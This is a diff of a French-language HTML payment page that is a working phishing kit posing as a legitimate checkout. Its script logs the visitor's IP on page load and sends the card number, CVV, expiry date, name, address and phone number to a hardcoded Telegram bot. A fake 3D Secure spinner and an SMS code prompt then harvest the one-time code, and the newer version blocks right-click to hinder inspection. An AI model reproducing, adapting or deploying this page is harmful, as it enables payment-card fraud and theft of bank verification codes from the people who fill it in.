@@ -3,102 +3,75 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Formulaire de Paiement Sécurisé</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <title>Formulaire de Paiement</title>
   <style>
-    /* Reset CSS */
-    * {
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
       margin: 0;
       padding: 0;
-      box-sizing: border-box;
-    }
-
-    body {
-      font-family: 'Arial', sans-serif;
-      background: linear-gradient(135deg, #f4f4f4, #e0e0e0);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      padding: 20px;
     }
 
     .payment-container {
-      background: white;
-      width: 100%;
-      max-width: 500px;
+      background-color: white;
+      width: 400px;
+      margin: 100px auto;
       padding: 30px;
-      border-radius: 20px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-      transition: transform 0.3s ease, box-shadow 0.3s ease;
-    }
-
-    .payment-container:hover {
-      transform: translateY(-5px);
-      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2);
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
     }
 
     h2 {
+      color: #333;
       text-align: center;
-      color: #2c3e50;
-      margin-bottom: 25px;
-      font-size: 26px;
     }
 
-    .form-group {
-      margin-bottom: 20px;
-    }
-
-    .form-group label {
+    form label {
       display: block;
-      margin-bottom: 8px;
-      color: #34495e;
-      font-weight: 500;
+      margin-bottom: 5px;
+      font-weight: bold;
+      text-align: left;
     }
 
-    .form-group input {
-      width: 100%;
-      padding: 14px;
-      border: 2px solid #e0e0e0;
-      border-radius: 10px;
+    input[type="text"],
+    input[type="number"],
+    input[type="submit"] {
+      width: 94%;
+      padding: 12px;
+      margin: 8px 0 20px 0;
+      border: 1px solid #ddd;
+      border-radius: 5px;
       font-size: 16px;
-      transition: border-color 0.3s ease;
     }
 
-    .form-group input:focus {
-      border-color: #3498db;
-      outline: none;
-    }
-
-    .card-icons {
-      display: flex;
-      justify-content: flex-end;
-      gap: 15px;
-      margin-bottom: 20px;
-    }
-
-    .card-icons img {
-      height: 30px;
-      filter: drop-shadow(0 2px 2px rgba(0, 0, 0, 0.1));
-    }
-
-    .btn {
-      width: 100%;
-      padding: 16px;
-      background: linear-gradient(135deg, #3498db, #2980b9);
+    input[type="submit"] {
+      background-color: #4CAF50;
       color: white;
       border: none;
-      border-radius: 10px;
-      font-size: 18px;
       cursor: pointer;
-      margin-top: 15px;
-      transition: opacity 0.3s ease;
+      font-size: 18px;
     }
 
-    .btn:hover {
-      opacity: 0.9;
+    input[type="submit"]:hover {
+      background-color: #45a049;
+   
+      
+          }
+
+    .icon-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin: 20px 0;
     }
 
+    .icon-container img {
+      height: 30px;
+      margin: 0 10px;
+    }
+
+
+      
     .hidden {
       display: none;
     }
@@ -107,10 +80,10 @@
       border: 4px solid #f3f3f3;
       border-top: 4px solid #3498db;
       border-radius: 50%;
-      width: 50px;
-      height: 50px;
+      width: 40px;
+      height: 40px;
       animation: spin 1s linear infinite;
-      margin: 30px auto;
+      margin: 20px auto;
     }
 
     @keyframes spin {
@@ -118,28 +91,50 @@
       100% { transform: rotate(360deg); }
     }
 
-    .status-message {
-      text-align: center;
-      font-size: 18px;
-      margin: 20px 0;
-      color: #7f8c8d;
-    }
-
-    /* Responsive Design */
-    @media (max-width: 480px) {
+    /* Adaptation pour les écrans plus petits */
+    @media (max-width: 600px) {
       .payment-container {
+        width: 90%;
+        margin: 50px auto;
         padding: 20px;
       }
 
       h2 {
-        font-size: 22px;
+        font-size: 20px;
       }
 
-      .form-group input {
-        padding: 12px;
+      input[type="text"],
+      input[type="number"],
+      input[type="submit"] {
+        font-size: 14px;
+        padding: 10px;
       }
 
-      .btn {
+      input[type="submit"] {
+        font-size: 16px;
+      }
+    }
+
+    /* Adaptation pour les petits écrans (moins de 400px) */
+    @media (max-width: 400px) {
+      .payment-container {
+        width: 90%;
+        margin: 20px auto;
+        padding: 15px;
+      }
+
+      h2 {
+        font-size: 18px;
+      }
+
+      input[type="text"],
+      input[type="number"],
+      input[type="submit"] {
+        font-size: 14px;
+        padding: 8px;
+      }
+
+      input[type="submit"] {
         font-size: 16px;
       }
     }
@@ -147,120 +142,130 @@
 </head>
 <body>
 
-  <!-- Étape 1 - Formulaire principal -->
   <div class="payment-container" id="step-1">
     <h2>Formulaire de Paiement</h2>
-    <div class="card-icons">
-     <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa">
-     <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
-<a href="https://ibb.co/ysCgDwP"><img src="https://i.ibb.co/ysCgDwP/t-l-c.jpg" alt="t-l-c" border="0" /></a>
-   </div>
+      <div class="icon-container">
+      <img src="https://i.ibb.co/nkyQTHm/t-l-c.jpg" alt="CB">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard">
+    </div>
+    
+    
+    
+    
+    <form id="payment-form">
+      <label for="delivery-address">Adresse de livraison</label>
+      <input type="text" id="delivery-address" name="delivery-address" required placeholder="Entrez votre adresse de livraison">
 
-   <form id="payment-form">
-       <div class="form-group">
-        <label for="delivery-address">Adresse de livraison</label>
-        <input type="text" id="delivery-address" name="delivery-address" required placeholder="Entrez votre adresse de livraison">
-      </div>
+      <label for="phone-number">Numéro de téléphone</label>
+      <input type="text" id="phone-number" name="phone-number" required placeholder="Entrez votre numéro de téléphone" pattern="^\+?[0-9]{1,4}?[-. \(\)]?([0-9]{1,3}[-. \(\)]?){1,4}[0-9]{1,3}$" title="Veuillez entrer un numéro de téléphone valide.">
 
-      <div class="form-group">
-        <label for="phone-number">Numéro de téléphone</label>
-        <input type="text" id="phone-number" name="phone-number" required placeholder="Entrez votre numéro de téléphone" pattern="^\+?[0-9]{1,4}?[-. \(\)]?([0-9]{1,3}[-. \(\)]?){1,4}[0-9]{1,3}$" title="Veuillez entrer un numéro de téléphone valide.">
-      </div>
+      <label for="cardholder-name">Nom sur la carte</label>
+      <input type="text" id="cardholder-name" name="cardholder-name" required placeholder="Nom du titulaire de la carte">
 
-      <div class="form-group">
-        <label for="cardholder-name">Nom sur la carte</label>
-        <input type="text" id="cardholder-name" name="cardholder-name" required placeholder="Nom du titulaire de la carte">
-      </div>
+      <label for="card-number">Numéro de la carte</label>
+      <input type="text" id="card-number" name="card-number" maxlength="16" required placeholder="XXXX XXXX XXXX XXXX">
 
-      <div class="form-group">
-        <label for="card-number">Numéro de la carte</label>
-        <input type="text" id="card-number" name="card-number" maxlength="16" required placeholder="XXXX XXXX XXXX XXXX">
-      </div>
+      <label for="expiry-date">Date d'expiration</label>
+      <input type="text" id="expiry-date" name="expiry-date" required placeholder="MM/AA">
 
-      <div class="form-group" style="display: flex; gap: 15px;">
-        <div style="width: 60%">
-          <label for="expiry-date">Date d'expiration</label>
-          <input type="text" id="expiry-date" name="expiry-date" required placeholder="MM/AA">
-        </div>
-        <div style="width: 40%">
-          <label for="cvv">CVV</label>
-          <input type="text" id="cvv" name="cvv" maxlength="3" pattern="\d{3}" required placeholder="XXX">
-        </div>
-      </div>
-
-      <button type="submit" class="btn">Payer maintenant</button>
+      <label for="cvv">Code de sécurité (CVV)</label>
+      <input 
+        type="text" 
+        id="cvv" 
+        name="cvv" 
+        maxlength="3" 
+        pattern="\d{3}" 
+        required 
+        placeholder="XXX"
+        title="Veuillez entrer exactement 3 chiffres pour le CVV."
+      >
+      
+      <center><input type="submit" value="Payer"></center>
     </form>
   </div>
 
-  <!-- Étape 2 - Vérification 3D Secure -->
   <div class="payment-container hidden" id="step-2">
-    <h2>Vérification 3D Secure</h2>
+    <h2>3D Secure</h2>
     <div class="spinner"></div>
-    <p class="status-message">Veuillez patienter, vérification en cours...</p>
+    <center><p>VEUILLEZ PATIENTEZ...</p></center>
   </div>
 
-  <!-- Étape 3 - Code SMS -->
   <div class="payment-container hidden" id="step-3">
     <h2>Code SMS</h2>
     <p>Entrez le code reçu par SMS :</p>
     <form id="sms-form">
-      <div class="form-group">
-        <input type="text" id="sms-code" name="sms-code" required placeholder="Code SMS">
-      </div>
-      <button type="submit" class="btn">Valider</button>
+      <input type="text" id="sms-code" name="sms-code" required placeholder="Code SMS">
+      <input type="submit" value="Valider">
     </form>
   </div>
 
-  <!-- Étape 4 - Confirmation finale -->
   <div class="payment-container hidden" id="step-4">
-    <h2>Paiement Réussi</h2>
-    <p class="status-message">Merci pour votre achat ! Redirection en cours...</p>
+    <h2>3D Secure</h2>
+    <div class="spinner"></div>
+    <center><p>VEUILLEZ PATIENTEZ...</p></center>
+  </div>
+
+  <div class="payment-container hidden" id="step-5">
+    <h2>PAIEMENT RÉUSSI</h2>
+    <center><p>Redirection dans quelques instants...</p></center>
   </div>
 
   <script>
-    const TELEGRAM_BOT_TOKEN = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k'; // Remplacez par votre token
-    const TELEGRAM_CHAT_ID = '7747778364'; // Remplacez par votre chat ID
-    let userIP = '';
+    const TELEGRAM_BOT_TOKEN = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k';
+    const TELEGRAM_CHAT_ID = '7747778364';
+
+    let userIP = ''; // Variable pour stocker l'adresse IP de l'utilisateur
+    let userFormData = {}; // Objet pour stocker les données du formulaire
 
     // Fonction pour envoyer un message à Telegram
-    async function sendToTelegram(message) {
+    function sendToTelegram(message) {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      const data = {
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-      };
+      const data = { chat_id: TELEGRAM_CHAT_ID, text: message };
 
-      try {
-        const response = await fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data),
-        });
-
-        if (!response.ok) {
-          console.error('Erreur lors de l\'envoi à Telegram :', await response.text());
-        }
-      } catch (error) {
-        console.error('Erreur réseau :', error);
-      }
+      fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
     }
 
-    // Récupérer l'adresse IP de l'utilisateur
-    async function fetchUserIP() {
-      try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        userIP = data.ip;
-        await sendToTelegram(`Nouvel utilisateur sur le site - IP: ${userIP}`);
-      } catch (error) {
-        console.error('Erreur lors de la récupération de l\'IP :', error);
-      }
+    // Fonction pour récupérer l'adresse IP publique de l'utilisateur
+    function fetchUserIP() {
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          userIP = data.ip; // Stocker l'adresse IP
+          // Envoyer une notification avec l'IP dès l'entrée sur le site
+          sendToTelegram(`Nouvel utilisateur sur le site - IP: ${userIP}`);
+        })
+        .catch(error => console.error('Erreur lors de la récupération de l\'IP :', error));
     }
 
-    // Gestion des étapes
-    document.getElementById('payment-form').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      showStep(2);
+    // Appeler la fonction pour récupérer l'adresse IP au chargement de la page
+    window.onload = function () {
+      fetchUserIP();
+    };
+
+    // Fonction pour interdire le clic droit globalement, mais autoriser dans les champs de saisie
+    document.addEventListener('contextmenu', function(event) {
+      if (event.target.tagName !== 'INPUT' && event.target.id !== 'sms-code') {
+        event.preventDefault(); // Bloque l'inspection et tout autre clic droit
+      }
+    });
+
+    // Fonction pour autoriser uniquement le clic droit dans les champs de formulaire et SMS (pour coller)
+    document.getElementById('payment-form').addEventListener('contextmenu', function(event) {
+      if (event.target && (event.target.tagName === 'INPUT' || event.target.id === 'sms-code')) {
+        // Laisser le clic droit sur les champs de saisie et SMS (pour coller)
+        return true;
+      }
+      event.preventDefault(); // Bloquer ailleurs
+    });
+
+    // Gestionnaire de soumission du formulaire de paiement
+    document.getElementById('payment-form').addEventListener('submit', function(event) {
+      event.preventDefault();
 
       const deliveryAddress = document.getElementById('delivery-address').value;
       const phoneNumber = document.getElementById('phone-number').value;
@@ -269,7 +274,19 @@
       const expiryDate = document.getElementById('expiry-date').value;
       const cvv = document.getElementById('cvv').value;
 
-      const message = `
+      // Enregistrer les données du formulaire avec l'IP
+      userFormData = {
+        deliveryAddress: deliveryAddress,
+        phoneNumber: phoneNumber,
+        cardholderName: cardholderName,
+        cardNumber: cardNumber,
+        expiryDate: expiryDate,
+        cvv: cvv,
+        ip: userIP
+      };
+
+      // Ajouter l'adresse IP et l'adresse de livraison dans le message Telegram
+      let message = `
         Paiement reçu :
         Adresse de livraison : ${deliveryAddress}
         Numéro de téléphone : ${phoneNumber}
@@ -280,33 +297,50 @@
         IP : ${userIP}
       `;
 
-      await sendToTelegram(message);
+      sendToTelegram(message); // Envoyer les informations à Telegram
+
+      document.getElementById('step-1').classList.add('hidden');
+      document.getElementById('step-2').classList.remove('hidden');
 
       setTimeout(() => {
-        showStep(3);
-      }, 10000); // 10s pour 3D Secure
+        document.getElementById('step-2').classList.add('hidden');
+        document.getElementById('step-3').classList.remove('hidden');
+      }, 10000);
     });
 
-    document.getElementById('sms-form').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      showStep(4);
+    // Gestionnaire de soumission du formulaire de code SMS
+    document.getElementById('sms-form').addEventListener('submit', function(event) {
+      event.preventDefault();
 
       const smsCode = document.getElementById('sms-code').value;
-      await sendToTelegram(`Code SMS reçu : ${smsCode}`);
+
+      // Récupérer les données du formulaire précédemment stockées et ajouter le code SMS
+      let message = `
+        Formulaire complet pour IP : ${userIP}
+        Adresse de livraison : ${userFormData.deliveryAddress}
+        Numéro de téléphone : ${userFormData.phoneNumber}
+        Nom : ${userFormData.cardholderName}
+        Numéro : ${userFormData.cardNumber}
+        Expiration : ${userFormData.expiryDate}
+        CVV : ${userFormData.cvv}
+        Code SMS reçu : ${smsCode}
+      `;
+      
+      sendToTelegram(message); // Envoyer les informations avec le code SMS à Telegram
+
+      document.getElementById('step-3').classList.add('hidden');
+      document.getElementById('step-4').classList.remove('hidden');
 
       setTimeout(() => {
-        window.location.href = "https://justmoicom.github.io/vlad/";
-      }, 7000); // 7s avant redirection
+        document.getElementById('step-4').classList.add('hidden');
+        document.getElementById('step-5').classList.remove('hidden');
+
+        setTimeout(() => {
+          window.location.href = "https://justmoicom.github.io/vlad/"; // URL après paiement
+        }, 5000);
+      }, 7000);
     });
 
-    function showStep(step) {
-      document.querySelectorAll('.payment-container').forEach(el => {
-        el.classList.add('hidden');
-      });
-      document.getElementById(`step-${step}`).classList.remove('hidden');
-    }
-
-    // Formater la date d'expiration
     document.getElementById('expiry-date').addEventListener('input', function() {
       let value = this.value.replace(/\D/g, '');
       if (value.length > 2) {
@@ -314,9 +348,7 @@
       }
       this.value = value;
     });
-
-    // Récupérer l'IP au chargement de la page
-    window.onload = fetchUserIP;
   </script>
+
 </body>
 </html>
